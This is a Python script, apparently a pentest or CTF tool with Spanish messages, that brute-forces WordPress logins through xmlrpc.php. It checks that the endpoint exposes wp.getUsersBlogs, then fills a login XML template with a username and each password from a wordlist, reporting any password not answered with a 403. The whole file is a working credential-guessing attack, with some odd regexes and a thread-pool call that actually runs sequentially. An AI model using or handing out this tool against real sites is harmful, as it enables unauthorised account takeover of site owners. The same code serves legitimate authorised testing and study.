#!/usr/bin/env python3
# Author: Juan García aka liandd
import signal
from termcolor import colored
import sys
import argparse
import os
import requests
import re
from concurrent.futures import ThreadPoolExecutor
import threading


# Ctrl_c
def def_handler(sig, frame):
    print(colored("\n[!] Saliendo...", "red"))
    sys.exit(1)


# Ctrl_c
signal.signal(signal.SIGINT, def_handler)


def get_arguments():
    parser = argparse.ArgumentParser(
        description=colored("evilXMLrpc bruteforcing attack", "green")+" by "+colored("liandd", "red"))
    parser.add_argument('-u', '--url', dest="URL",
                        help="WordPress URL to bruteforce (i.e --url http://127.0.0.1:31337)")
    parser.add_argument('-n', '--name', dest="NAME",
                        help="Username to exec bruteforce (i.e --name liandd)")
    parser.add_argument('-w', '--wordlist', dest="WORDLIST",
                        help="Wordlist to try the bruteforcing (i.e --wordlist /usr/share/SecLists/rockyou.txt)")
    options = parser.parse_args()
    if options.URL is None or options.NAME is None or options.WORDLIST is None:
        parser.print_help()
        sys.exit(1)
    return options.URL, options.NAME, options.WORDLIST


def XMLrpc_ffuf(url):
    """Revisar que la url tenga un xmlrpc.php valido !(tampered, disabled, hardcoded, not working)"""
    global cms_url
    cms_url = url+'/xmlrpc.php'
    if os.path.exists("request.xml"):
        with open("request.xml", "r") as xml_request:
            data = xml_request.read()
            raw_response = requests.post(cms_url, data=data)
            response = raw_response.text
            regex = r"wp.{4}+[U].*[B].*s\b"
            if re.findall(regex, response):
                print(
                    colored(f"\n[+] Se ha encontrado el método {re.findall(regex, response)}\n", "green"))
            else:
                print(
                    colored("\n[!] No es posible hacer bruteforcing...", "red"))
                sys.exit(1)
    else:
        with open("request.xml", "w") as create_xml_request:
            create_xml_request.write("""<?xml version="1.0" encoding="utf-8"?>
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>""")
        XMLrpc_ffuf(url)


def passwd_ffuz(user, passwd):
    if stop_event.is_set():
        return
    data = ""
    with open("file.xml", "r") as xml_to_fuzz:
        data = xml_to_fuzz.read()
        user_regex = "...{.{5}+[u].*[}]"
        passwd_regex = "...{.{5}+[p].*[}]"
        tmp_data_regex = re.sub(user_regex, user, data)
        data_regex = re.sub(passwd_regex, passwd, tmp_data_regex)
        raw_response = requests.post(cms_url, data=data_regex)
        response = raw_response.text
        error_regex = "403"
        if re.findall(error_regex, response):
            return
        else:
            print(
                colored(f"\n[+] La contraseña para el usuario {user} es {passwd}\n", "green"))
            stop_event.set()
            return


def XMLbrute_force(url, name, wordlist):
    XMLrpc_ffuf(url)
    """Revisa la estructura XML para identificar si es posible hacer el ataque"""
    with ThreadPoolExecutor(max_workers=50) as executor:
        with open(wordlist, "r") as w:
            for secret in w:
                if stop_event.is_set():
                    break
                executor.submit(passwd_ffuz(name, secret))
            executor.shutdown(wait=True)


def main():
    URL, NAME, WORDLIST = get_arguments()
    global stop_event
    stop_event = threading.Event()
    XMLbrute_force(URL, NAME, WORDLIST)
    sys.exit(0)


if __name__ == '__main__':
    main()
